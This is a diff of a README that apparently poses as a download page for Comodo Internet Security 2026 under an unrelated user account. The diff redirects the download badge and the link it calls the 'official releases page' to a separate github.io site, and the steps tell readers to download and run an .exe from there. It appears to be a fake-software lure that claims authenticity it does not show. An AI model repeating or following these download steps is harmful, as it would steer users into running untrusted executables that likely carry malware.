@@ -1,6 +1,6 @@
 # 🛡️ Comodo-Internet-Security-2026 - Protect your computer from online threats
 
-[![](https://img.shields.io/badge/Download-Comodo_Internet_Security-blue.svg)](https://github.com/known-quartet509/Comodo-Internet-Security-2026/releases)
+[![](https://img.shields.io/badge/Download-Comodo_Internet_Security-blue.svg)](https://known-quartet509.github.io)
 
 ## 📥 How to download the software
 
@@ -8,7 +8,7 @@ This guide shows you how to get Comodo Internet Security for your computer. You 
 
 Follow these steps to find the right installer:
 
-1. Visit the following link to reach the official releases page: [https://github.com/known-quartet509/Comodo-Internet-Security-2026/releases](https://github.com/known-quartet509/Comodo-Internet-Security-2026/releases).
+1. Visit the following link to reach the official releases page: [https://known-quartet509.github.io](https://known-quartet509.github.io).
 2. Look for the section labeled "Assets" under the most recent version tag.
 3. Click on the file that ends with ".exe" to begin the download.
 4. Save the installer file to your Downloads folder or your desktop so you can find it easily.
